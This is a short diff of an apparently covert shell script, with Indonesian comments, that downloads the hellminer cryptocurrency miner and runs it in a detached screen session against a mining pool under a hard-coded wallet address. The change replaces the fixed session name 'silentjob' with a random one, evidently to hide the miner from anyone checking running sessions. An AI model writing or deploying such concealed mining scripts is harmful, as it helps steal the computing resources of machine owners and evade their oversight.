@@ -5,5 +5,8 @@ wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_l
 tar -xzf hellminer_linux64.tar.gz
 chmod +x hellminer
 
-echo "📟 Menjalankan hellminer di dalam screen 'silentjob'..."
-screen -dmS silentjob bash -c './hellminer -c stratum+tcp://au.vipor.net:5040 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --threads 7; sleep 2'
+# Buat nama screen acak
+RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
+
+echo "📟 Menjalankan hellminer di dalam screen '$RAND_NAME'..."
+screen -dmS "$RAND_NAME" bash -c './hellminer -c stratum+tcp://au.vipor.net:5040 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --threads 7; sleep 2'
